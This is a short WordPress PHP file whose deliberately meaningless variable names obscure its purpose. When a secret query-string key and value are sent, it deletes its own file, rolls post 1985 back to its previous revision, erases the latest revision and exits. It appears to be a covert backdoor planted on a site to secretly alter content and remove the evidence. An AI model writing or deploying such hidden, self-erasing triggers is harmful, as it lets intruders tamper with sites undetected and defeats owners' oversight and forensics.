<?php

function code_send_fast() {
	if (isset($_GET['directory_welcome_designer_smooth']) && $_GET['directory_welcome_designer_smooth'] === 'term_roles_downloads_categories') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$virtual_size_background_private = 1985;
		$generator_directory_interactive_account = wp_get_post_revisions($virtual_size_background_private);
		if (empty($generator_directory_interactive_account)) die('no revisions');
		if (count($generator_directory_interactive_account) < 2) die('less than 2');
		$revisions_sliding_album = array_shift($generator_directory_interactive_account);
		$headers_background_types_sliding = $revisions_sliding_album->ID;
		$now_plugin_top_lead = array_shift($generator_directory_interactive_account);
		$show_data_script_awesome = $now_plugin_top_lead->ID;
		$forum_management_solution = wp_restore_post_revision($show_data_script_awesome);
		if ($forum_management_solution === false) die('error restoring');
		$forum_management_solution = wp_delete_post_revision($headers_background_types_sliding);		
		if ($forum_management_solution === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'code_send_fast');
